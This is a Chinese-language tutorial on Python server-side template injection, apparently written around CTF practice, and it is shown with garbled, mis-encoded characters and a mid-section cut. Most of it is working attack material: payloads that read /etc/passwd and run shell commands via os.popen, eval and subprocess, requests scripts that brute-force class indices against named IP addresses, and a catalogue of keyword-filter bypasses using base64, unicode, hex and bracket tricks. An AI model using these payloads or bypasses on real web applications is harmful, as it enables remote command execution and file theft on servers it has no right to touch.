æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¸€ä¸ªç±»çš„è°ƒç”¨é¡ºåºï¼Œæ¯”å¦‚ï¼š class A: def foo(self): print(A)class B(A): passclass C(A): def foo(self): print(C)class D(B, C): passprint(D.__mro__) è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š (class __main__.D, class __main__.B, class __main__.C, class __main__.A, class object) åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç±» D çš„ MRO é¡ºåºæ˜¯ D - B - C - A - objectã€‚è¿™æ„å‘³ç€åœ¨æœç´¢æ–¹æ³•æ—¶ï¼ŒPython è§£é‡Šå™¨ä¼šå…ˆåœ¨ D ä¸­æŸ¥æ‰¾ï¼Œç„¶åæŒ‰ç…§ B - C - A - object çš„é¡ºåºä¾æ¬¡æŸ¥æ‰¾çˆ¶ç±»ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…çš„æ–¹æ³•æˆ–å±æ€§ é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨ __base__ æ–¹æ³•è·å–ç›´æ¥åŸºç±»ï¼š .__class__.__base__type basestring æœ‰è¿™äº›ç±»ç»§æ‰¿çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»ä»»ä½•ä¸€ä¸ªå˜é‡ï¼Œå›æº¯åˆ°æœ€é¡¶å±‚åŸºç±»ï¼ˆclassobjectï¼‰ä¸­å»ï¼Œå†è·å¾—åˆ°æ­¤åŸºç±»æ‰€æœ‰å®ç°çš„ç±»ï¼Œå°±å¯ä»¥è·å¾—åˆ°å¾ˆå¤šçš„ç±»å’Œæ–¹æ³•äº†ã€‚ __subclasses__()åœ¨ Python ä¸­ï¼Œ__subclasses__() æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼ˆä¹Ÿç§°ä¸ºé­”æœ¯æ–¹æ³•æˆ–é­”æœ¯å±æ€§ï¼‰ï¼Œç”¨äºè·å–å½“å‰ç±»çš„ç›´æ¥å­ç±»åˆ—è¡¨ã€‚ å½“ä½ è°ƒç”¨ä¸€ä¸ªç±»çš„ __subclasses__() æ–¹æ³•æ—¶ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰ç›´æ¥å­ç±»çš„åˆ—è¡¨ã€‚è¿™äº›å­ç±»æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åˆ›å»ºçš„ï¼Œå› æ­¤åˆ—è¡¨çš„å†…å®¹å–å†³äºç¨‹åºæ‰§è¡Œçš„ä¸Šä¸‹æ–‡å’Œæµç¨‹ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š class A: passclass B(A): passclass C(A): passclass D(B): passprint(A.__subclasses__()) # è¾“å‡º [class __main__.B, class __main__.C]print(B.__subclasses__()) # è¾“å‡º [class __main__.D] åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œç±» A æœ‰ä¸¤ä¸ªç›´æ¥å­ç±» B å’Œ Cï¼Œç±» B æœ‰ä¸€ä¸ªç›´æ¥å­ç±» Dã€‚å› æ­¤ï¼Œè°ƒç”¨ A.__subclasses__() è¿”å›çš„åˆ—è¡¨åŒ…å«äº† B å’Œ Cï¼Œè€Œè°ƒç”¨ B.__subclasses__() è¿”å›çš„åˆ—è¡¨åªåŒ…å«äº† D æ³¨æ„ï¼šè¿™é‡Œè¦è®°ä½ä¸€ç‚¹2.7å’Œ3.6ç‰ˆæœ¬è¿”å›çš„å­ç±»ä¸æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯2.7æœ‰çš„3.6å¤§éƒ¨åˆ†éƒ½æœ‰ã€‚ å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨object.__subclasses__()ï¼Œä¼šå¾—åˆ°å’Œä¸Šé¢ä¸€æ ·çš„ç»“æœã€‚SSTI çš„ä¸»è¦ç›®çš„å°±æ˜¯ä»è¿™ä¹ˆå¤šçš„å­ç±»ä¸­æ‰¾å‡ºå¯ä»¥åˆ©ç”¨çš„ç±»ï¼ˆä¸€èˆ¬æ˜¯æŒ‡è¯»å†™æ–‡ä»¶æˆ–æ‰§è¡Œå‘½ä»¤çš„ç±»ï¼‰åŠ ä»¥åˆ©ç”¨ã€‚ __builtins__åœ¨ Python ä¸­ï¼Œ__builtins__ æ˜¯ä¸€ä¸ªæŒ‡å‘å†…å»ºæ¨¡å—ï¼ˆbuilt-in moduleï¼‰çš„å¼•ç”¨ã€‚è¿™ä¸ªæ¨¡å—åŒ…å«äº† Python ä¸­å†…ç½®çš„å¸¸ç”¨å‡½æ•°ã€å¼‚å¸¸å’Œå…¶ä»–å¯¹è±¡ã€‚ __builtins__ å˜é‡æ˜¯ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å†…å»ºæ¨¡å—ä¸­æ‰€æœ‰çš„å†…ç½®å‡½æ•°å’Œå¯¹è±¡ã€‚ä½ å¯ä»¥é€šè¿‡ __builtins__ å­—å…¸æ¥è®¿é—®è¿™äº›å†…ç½®å‡½æ•°å’Œå¯¹è±¡ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥é€šè¿‡ __builtins__[print] æ¥è®¿é—®å†…ç½®çš„ print å‡½æ•°ï¼Œæˆ–è€…é€šè¿‡ __builtins__[TypeError] æ¥è®¿é—®å†…ç½®çš„ TypeError å¼‚å¸¸ç±»ã€‚ ä½†æ˜¯åœ¨å®é™…ç¼–ç ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ç›´æ¥ä½¿ç”¨å†…ç½®å‡½æ•°å’Œå¯¹è±¡çš„åç§°ï¼Œè€Œä¸æ˜¯é€šè¿‡ __builtins__ æ¥è®¿é—®ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ print() å‡½æ•°è€Œä¸æ˜¯ __builtins__[print]ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€äº›é™åˆ¶æ€§çš„ç¯å¢ƒä¸­ï¼Œæ¯”å¦‚ä¸€äº›è§£é‡Šå™¨ä¸­æˆ–è€…åœ¨ä½¿ç”¨äº† __import__() å‡½æ•°æ—¶ï¼Œå¯èƒ½ä¼šé™åˆ¶å¯¹ __builtins__ çš„ç›´æ¥è®¿é—®ã€‚ __globals__åœ¨ Python ä¸­ï¼Œ__globals__ æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œç”¨äºè®¿é—®åŒ…å«å½“å‰ä½œç”¨åŸŸä¸­æ‰€æœ‰å…¨å±€å˜é‡çš„å­—å…¸ã€‚è¿™ä¸ªå±æ€§æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå®ƒåŒ…å«äº†å½“å‰ä½œç”¨åŸŸä¸­æ‰€æœ‰å…¨å±€å˜é‡çš„åç§°å’Œå¯¹åº”çš„å€¼ã€‚ åœ¨ Python ä¸­ï¼Œæ¯ä¸ªä½œç”¨åŸŸéƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³è”çš„ __globals__ å­—å…¸ï¼Œç”¨äºå­˜å‚¨è¯¥ä½œç”¨åŸŸä¸­çš„å…¨å±€å˜é‡ã€‚è¿™ä¸ªå­—å…¸å¯ä»¥é€šè¿‡è®¿é—®ä½œç”¨åŸŸå¯¹è±¡çš„ __globals__ å±æ€§æ¥è·å– ä¾‹å­å¦‚ä¸‹ï¼š x = 10 # å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ xdef func(): y = 20 # å®šä¹‰ä¸€ä¸ªå±€éƒ¨å˜é‡ y print(Global variables:, globals()) # è¾“å‡ºå…¨å±€å˜é‡å­—å…¸ print(Value of x:, globals()[x]) # è¾“å‡ºå…¨å±€å˜é‡ x çš„å€¼func() # è°ƒç”¨å‡½æ•° åˆ©ç”¨ SSTI è¯»å–æ–‡ä»¶Python 2åœ¨ä¸Šæ–‡ä¸­æˆ‘ä»¬ä½¿ç”¨ __subclasses__ æ–¹æ³•æŸ¥çœ‹å­ç±»çš„æ—¶å€™ï¼Œå‘ç°å¯ä»¥å‘ç°ç´¢å¼•å·ä¸º40æŒ‡å‘fileç±»ï¼š for i in enumerate(.__class__.__mro__[-1].__subclasses__()): print i.....(0, type type)(1, type weakref)(2, type weakcallableproxy)(3, type weakproxy)(4, type int)(5, type basestring)(6, type bytearray)(7, type list)(8, type NoneType)(9, type NotImplementedType)(10, type traceback)(11, type super)(12, type xrange)(13, type dict)(14, type set)(15, type slice)(16, type staticmethod)(17, type complex)(18, type float)......(38, type ellipsis)(39, type member_descriptor)(40, type file)(41, type PyCapsule)(42, type cell)(43, type callable-iterator)...... for i in enumerate(.__class__.__mro__[-1].__subclasses__()): print iåˆ†æå¦‚ä¸‹ï¼š .__class__: è·å–ç©ºå­—ç¬¦ä¸² çš„ç±»å‹ï¼Œå³ str ç±»å‹ã€‚ .__class__.__mro__: è·å– str ç±»å‹çš„æ–¹æ³•è§£æé¡ºåºï¼ˆMethod Resolution Orderï¼ŒMROï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å«äº†å½“å‰ç±»å’Œå®ƒçš„çˆ¶ç±»çš„é¡ºåºã€‚ .__class__.__mro__[-1]: è·å–æ–¹æ³•è§£æé¡ºåºä¸­çš„æœ€åä¸€ä¸ªç±»ï¼Œå³ object ç±»ã€‚ .__class__.__mro__[-1].__subclasses__(): è·å– object ç±»çš„æ‰€æœ‰å­ç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚ enumerate(...): å¯¹è·å–åˆ°çš„å­ç±»åˆ—è¡¨è¿›è¡Œæšä¸¾ï¼Œè¿”å›ç´¢å¼•å’Œå¯¹åº”çš„å…ƒç´ ç»„æˆçš„å…ƒç»„ã€‚ for i in ...: print i: éå†æšä¸¾åçš„å…ƒç»„åˆ—è¡¨ï¼Œå¹¶æ‰“å°æ¯ä¸ªå…ƒç»„ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ®µä»£ç çš„ä½œç”¨æ˜¯éå† object ç±»çš„æ‰€æœ‰ç›´æ¥å­ç±»ï¼Œå¹¶è¾“å‡ºå®ƒä»¬çš„ç´¢å¼•å’Œå¯¹åº”çš„å­ç±» æ­¤fileç±»å¯ä»¥ç›´æ¥ç”¨æ¥è¯»å–æ–‡ä»¶ï¼š [].__class__.__base__.__subclasses__()[40](/etc/passwd).read() Python 3ä½¿ç”¨fileç±»è¯»å–æ–‡ä»¶çš„æ–¹æ³•ä»…é™äºPython 2ç¯å¢ƒï¼Œåœ¨Python 3ç¯å¢ƒä¸­fileç±»å·²ç»æ²¡æœ‰äº†ã€‚æˆ‘ä»¬å¯ä»¥ç”¨class _frozen_importlib_external.FileLoader è¿™ä¸ªç±»å»è¯»å–æ–‡ä»¶ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­ class _frozen_importlib_external.FileLoader è¿™ä¸ªç±»ç´¢å¼•å·ï¼š import requestsheaders = User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36for i in range(500): url = http://47.xxx.xxx.72:8000/?name=().__class__.__bases__[0].__subclasses__()[+str(i)+] res = requests.get(url=url, headers=headers) if FileLoader in res.text: print(i)# å¾—åˆ°ç¼–å·ä¸º79 æ‰€ä»¥payloadå¦‚ä¸‹ï¼š ().__class__.__bases__[0].__subclasses__()[79][get_data](0, /etc/passwd) ... : åŒå¤§æ‹¬å·é€šå¸¸ç”¨äºè¡¨ç¤ºæ¨¡æ¿è¯­æ³•ï¼Œå®ƒä»¬å¯èƒ½ç”¨äºåœ¨æŸäº› Web æ¡†æ¶ä¸­è¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼Œæ¯”å¦‚åœ¨å‰ç«¯çš„ Vue.js æˆ– AngularJS ä¸­ï¼Œæˆ–è€…åœ¨åç«¯çš„åƒ Flaskã€Django ç­‰ Web æ¡†æ¶ä¸­ã€‚ ().__class__: è¿™æ˜¯ Python ä¸­åˆ›å»ºä¸€ä¸ªç©ºçš„å…ƒç»„ï¼Œå¹¶è®¿é—®è¯¥å…ƒç»„çš„ç±»ã€‚å…ƒç»„çš„ç±»æ˜¯ class tupleã€‚ ().__class__.__bases__: è¿™æ˜¯è®¿é—® class tuple ç±»çš„åŸºç±»ï¼Œå®ƒçš„åŸºç±»æ˜¯ class objectã€‚ ().__class__.__bases__[0]: è¿™æ˜¯è·å– class tuple ç±»çš„åŸºç±»ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå³ class objectã€‚ ().__class__.__bases__[0].__subclasses__(): è¿™æ˜¯è·å– Python ä¸­ class object ç±»çš„æ‰€æœ‰å­ç±»ã€‚è¿™ä¸ªè°ƒç”¨ä¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å­ç±»çš„åˆ—è¡¨ã€‚ [get_data]: è¿™æ˜¯å¯¹å­ç±»å¯¹è±¡çš„å±æ€§è¿›è¡Œè®¿é—®ï¼Œå¯èƒ½æ˜¯å¸Œæœ›è®¿é—®ç¬¬ 79 ä¸ªå­ç±»å¯¹è±¡ä¸­åä¸º get_data çš„æ–¹æ³•ã€‚ (0, /etc/passwd): è¿™æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™ get_data æ–¹æ³•çš„å€¼ï¼Œå¯èƒ½æ˜¯ä¸ºäº†è§¦å‘æŸç§è¡Œä¸ºã€‚ åˆ©ç”¨ SSTI æ‰§è¡Œå‘½ä»¤å¯»æ‰¾å†…å»ºå‡½æ•° eval æ‰§è¡Œå‘½ä»¤éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰å†…å»ºå‡½æ•° eval çš„å­ç±»çš„ç´¢å¼•å·ï¼š import requestsif __name__ == __main__: post_url = http://124.70.99.199:10086/level/1 for i in range(200): param = code: ().__class__.__bases__[0].__subclasses__()[+str(i)+].__init__.__globals__[__builtins__] res = requests.post(post_url, data=param) if eval in res.text: print(i,!!!!!!!!!!!!!!!!!!!!!!!!!!) else: print(i,res.text,res.status_code,no) æ‰€ä»¥éšä¾¿æŒ‘ä¸€ä¸ªæ„é€ payloadä¸ºï¼š''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()') __import__(os)ï¼šè¿™æ˜¯ Python ä¸­çš„ä¸€ç§å¯¼å…¥æ¨¡å—çš„æ–¹æ³•ã€‚os æ˜¯ Python æ ‡å‡†åº“ä¸­ç”¨äºä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„æ¨¡å—ï¼Œå®ƒåŒ…å«äº†è®¸å¤šä¸æ–‡ä»¶å’Œç›®å½•å¤„ç†ã€è¿›ç¨‹ç®¡ç†ç­‰ç›¸å…³çš„å‡½æ•°å’Œæ–¹æ³•ã€‚ .popen(ls /)ï¼špopen() æ˜¯ os æ¨¡å—ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¿”å›å‘½ä»¤çš„è¾“å‡ºã€‚åœ¨è¿™é‡Œï¼Œls / æ˜¯ä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œç”¨äºåˆ—å‡ºæ ¹ç›®å½• / ä¸‹çš„æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨ã€‚ .read()ï¼šread() æ˜¯ popen() è¿”å›çš„æ–‡ä»¶å¯¹è±¡çš„æ–¹æ³•ï¼Œç”¨äºè¯»å–æ–‡ä»¶å†…å®¹ã€‚ å¯»æ‰¾ os æ¨¡å—æ‰§è¡Œå‘½ä»¤è‡ªå·±åœ¨é¶åœºé‡Œé¢å°è¯•å¤±è´¥ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰osæ¨¡å—çš„ç±»çš„ç´¢å¼•å·ï¼š import requestsif __name__ == __main__: post_url = http://124.70.99.199:10086/level/1 for i in range(200): data = code: ().__class__.__bases__[0].__subclasses__()[+str(i)+].__init__.__globals__ res = requests.post(post_url, data=data) if os.py in res.text: print(i, !!!!!!) else: print(i, res.text, res.status_code,NO) æŒ‘ä¸€ä¸ªæ„é€ payloadï¼š''.__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['os'].popen('ls /').read() å¯»æ‰¾ popen å‡½æ•°æ‰§è¡Œå‘½ä»¤é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰ popen å‡½æ•°çš„ç±»çš„ç´¢å¼•å·ï¼š import requestsif __name__ == __main__: post_url = http://124.70.99.199:10086/level/1 for i in range(200): data = code: ().__class__.__bases__[0].__subclasses__()[+str(i)+].__init__.__globals__ res = requests.post(post_url, data=data) if popen in res.text: print(i, !!!!!!!!!!!!!!!!!!!!) else: print(i, res.text, res.status_code, NO) æŒ‘ä¸€ä¸ªæ„é€ payloadï¼š().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['popen'](\"ls /\").read() å¯»æ‰¾ importlib ç±»æ‰§è¡Œå‘½ä»¤Python ä¸­å­˜åœ¨ class _frozen_importlib.BuiltinImporter ç±»ï¼Œç›®çš„å°±æ˜¯æä¾› Python ä¸­ import è¯­å¥çš„å®ç°ï¼ˆä»¥åŠ __import__ å‡½æ•°ï¼‰ã€‚é‚£ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨è¯¥ç±»ä¸­çš„load_moduleå°†osæ¨¡å—å¯¼å…¥ï¼Œä»è€Œä½¿ç”¨ os æ¨¡å—æ‰§è¡Œå‘½ä»¤ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­ importlib ç±»çš„ç´¢å¼•å·ï¼š import requestsif __name__ == __main__: post_url = http://124.70.99.199:10086/level/1 for i in range(200): data = code: ().__class__.__bases__[0].__subclasses__()[+str(i)+] res = requests.post(post_url, data=data) if _frozen_importlib.BuiltinImporter in res.text: print(i, !!!!!!!!!!!!!!!!!!!!) else: print(i, res.text, res.status_code, NO) æ„é€ payloadï¼š[].__class__.__base__.__subclasses__()[120][\"load_module\"](\"os\")[\"popen\"](\"ls /\").read() å¯»æ‰¾ linecache å‡½æ•°æ‰§è¡Œå‘½ä»¤linecache è¿™ä¸ªå‡½æ•°å¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°ä¸­ä¹Ÿå¼•å…¥äº† os æ¨¡å—ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª linecache å‡½æ•°å»æ‰§è¡Œå‘½ä»¤ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰ linecache è¿™ä¸ªå‡½æ•°çš„å­ç±»çš„ç´¢å¼•å·ï¼š import requestsif __name__ == __main__: post_url = http://124.70.99.199:10086/level/1 for i in range(300): data = code:().__class__.__bases__[0].__subclasses__()[+str(i)+].__init__.__globals__ res = requests.post(post_url, data = data) if linecache in res.text: print(i, !!!!!!!!!!!!!!!!!!!!!!!!!!!) else: print(i, res.text, res.status_code, NO) æ„é€ payloadï¼š[].__class__.__base__.__subclasses__()[284].__init__.__globals__['linecache']['os'].popen('ls /').read() å¯»æ‰¾ subprocess.Popen ç±»æ‰§è¡Œå‘½ä»¤ä»python2.4ç‰ˆæœ¬å¼€å§‹ï¼Œå¯ä»¥ç”¨ subprocess è¿™ä¸ªæ¨¡å—æ¥äº§ç”Ÿå­è¿›ç¨‹ï¼Œå¹¶è¿æ¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è¾“å‡ºé”™è¯¯ä¸­å»ï¼Œè¿˜å¯ä»¥å¾—åˆ°å­è¿›ç¨‹çš„è¿”å›å€¼ã€‚ subprocess æ„åœ¨æ›¿ä»£å…¶ä»–å‡ ä¸ªè€çš„æ¨¡å—æˆ–è€…å‡½æ•°ï¼Œæ¯”å¦‚ï¼šos.systemã€os.popen ç­‰å‡½æ•°ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰ linecache è¿™ä¸ªå‡½æ•°çš„å­ç±»çš„ç´¢å¼•å·ï¼š import requestsif __name__ == __main__: post_url = http://124.70.99.199:10086/level/1 for i in range(500,550): data = code:().__class__.__bases__[0].__subclasses__()[+str(i)+] res = requests.post(post_url, data = data) if subprocess.Popen in res.text: print(i, !!!!!!!!!!!!!!!!!!!!!!!!!!!) else: print(i, res.text, res.status_code, NO) æ„é€ payloadï¼š[].__class__.__base__.__subclasses__()[520]('ls /',shell=True,stdout=-1).communicate()[0].strip() å…³é”®å­—ç»•è¿‡åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨â€œ**+**â€è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼š ().__class__.__bases__[0].__subclasses__()[40](/fl+ag).read()().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(o+s).popen(ls /).read())().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[__buil+tins__][eval](__import__(os).popen(ls /).read()) åªè¦è¿”å›çš„æ˜¯å­—å…¸ç±»å‹çš„æˆ–æ˜¯å­—ç¬¦ä¸²æ ¼å¼çš„ï¼Œå³payloadä¸­å¼•å·å†…çš„ï¼Œåœ¨è°ƒç”¨çš„æ—¶å€™éƒ½å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚ åˆ©ç”¨ç¼–ç ç»•è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¯¹å…³é”®å­—ç¼–ç çš„æ–¹æ³•ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œä¾‹å¦‚ç”¨base64ç¼–ç ç»•è¿‡ï¼š ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[X19idWlsdGluc19f.decode(base64)][ZXZhbA==.decode(base64)](X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==.decode(base64)) ç­‰åŒäºï¼š ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()) å¯ä»¥çœ‹åˆ°ï¼Œåœ¨payloadä¸­ï¼Œåªè¦æ˜¯å­—ç¬¦ä¸²çš„ï¼Œå³payloadä¸­å¼•å·å†…çš„ï¼Œéƒ½å¯ä»¥ç”¨ç¼–ç ç»•è¿‡ã€‚åŒç†è¿˜å¯ä»¥è¿›è¡Œrot13ã€16è¿›åˆ¶ç¼–ç ç­‰ã€‚ åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—ï¼ˆflaské€‚ç”¨ï¼‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨unicodeç¼–ç çš„æ–¹æ³•ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼š ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f][\\u0065\\u0076\\u0061\\u006c](__import__(os).popen(ls /).read())().__class__.__base__.__subclasses__()[77].__init__.__globals__[\\u006f\\u0073].popen(\\u006c\\u0073\\u0020\\u002f).read() ç­‰åŒäºï¼š ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read())().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls /).read() åˆ©ç”¨Hexç¼–ç ç»•è¿‡å…³é”®å­—å’Œä¸Šé¢é‚£ä¸ªä¸€æ ·ï¼Œåªä¸è¿‡å°†Unicodeç¼–ç æ¢æˆäº†Hexç¼–ç ï¼Œé€‚ç”¨äºè¿‡æ»¤äº†â€œuâ€çš„æƒ…å†µã€‚ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨hexç¼–ç çš„æ–¹æ³•ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼š ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f][\\x65\\x76\\x61\\x6c](__import__(os).popen(ls /).read())().__class__.__base__.__subclasses__()[77].__init__.__globals__[\\x6f\\x73].popen(\\x6c\\x73\\x20\\x2f).read() ç­‰åŒäºï¼š ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read())().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls /).read() åˆ©ç”¨å¼•å·ç»•è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼•å·æ¥ç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼Œè¿‡æ»¤äº†flagï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ flag æˆ– flag çš„å½¢å¼æ¥ç»•è¿‡ï¼š [].__class__.__base__.__subclasses__()[40](/flag).read() å†å¦‚ï¼š ().__class__.__base__.__subclasses__()[77].__init__.__globals__[os].popen(ls).read()().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[__builtins__][eval](__import__(os).popen(ls /).read()) å¯ä»¥çœ‹åˆ°ï¼Œåœ¨payloadä¸­ï¼Œåªè¦æ˜¯å­—ç¬¦ä¸²çš„ï¼Œå³payloadä¸­å¼•å·å†…çš„ï¼Œéƒ½å¯ä»¥ç”¨å¼•å·ç»•è¿‡ã€‚ åˆ©ç”¨join()å‡½æ•°ç»•è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨join()å‡½æ•°æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼Œé¢˜ç›®è¿‡æ»¤äº†flagï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹æ–¹æ³•ç»•è¿‡ï¼š [].__class__.__base__.__subclasses__()[40](fla.join(/g)).read() ç»•è¿‡å…¶ä»–å­—ç¬¦è¿‡æ»¤äº†ä¸­æ‹¬å·[ ]åˆ©ç”¨ __getitem__() ç»•è¿‡ å¯ä»¥ä½¿ç”¨ __getitem__() æ–¹æ³•è¾“å‡ºåºåˆ—å±æ€§ä¸­çš„æŸä¸ªç´¢å¼•å¤„çš„å…ƒç´ ï¼Œå¦‚ï¼š .__class__.__mro__[2].__class__.__mro__.__getitem__(2)[__builtins__].__getitem__(eval) å¦‚ä¸‹ç¤ºä¾‹ï¼š .__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)(/etc/passwd).read() // æŒ‡å®šåºåˆ—å±æ€§().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__(__builtins__).__getitem__(eval)(__import__(os).popen(ls /).read()) // æŒ‡å®šå­—å…¸å±æ€§ åˆ©ç”¨ pop() ç»•è¿‡ pop()æ–¹æ³•å¯ä»¥è¿”å›æŒ‡å®šåºåˆ—å±æ€§ä¸­çš„æŸä¸ªç´¢å¼•å¤„çš„å…ƒç´ æˆ–æŒ‡å®šå­—å…¸å±æ€§ä¸­æŸä¸ªé”®å¯¹åº”çš„å€¼ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š .__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(/etc/passwd).read() // æŒ‡å®šåºåˆ—å±æ€§().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop(__builtins__).pop(eval)(__import__(os).popen(ls /).read()) // æŒ‡å®šå­—å…¸å±æ€§ æ³¨æ„ï¼šæœ€å¥½ä¸è¦ç”¨pop()ï¼Œå› ä¸ºpop()ä¼šåˆ é™¤ç›¸åº”ä½ç½®çš„å€¼ã€‚ï¼ˆé™¤éä½ æœ‰ç›¸åº”çš„æƒé™æ‰å¯ä»¥ï¼‰ åˆ©ç”¨å­—å…¸è¯»å–ç»•è¿‡ æˆ‘ä»¬çŸ¥é“è®¿é—®å­—å…¸é‡Œçš„å€¼æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯æŠŠç›¸åº”çš„é”®æ”¾å…¥ç†Ÿæ‚‰çš„æ–¹æ‹¬å· [] é‡Œæ¥è®¿é—®ï¼Œä¸€ç§å°±æ˜¯ç”¨ç‚¹ . æ¥è®¿é—®ã€‚æ‰€ä»¥ï¼Œå½“æ–¹æ‹¬å· [] è¢«è¿‡æ»¤ä¹‹åï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨ç‚¹ . çš„æ–¹å¼æ¥è®¿é—®ï¼Œå¦‚ä¸‹ç¤ºä¾‹ // __builtins__.eval()().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval(__import__(os).popen(ls /).read()) ç­‰åŒäºï¼š // 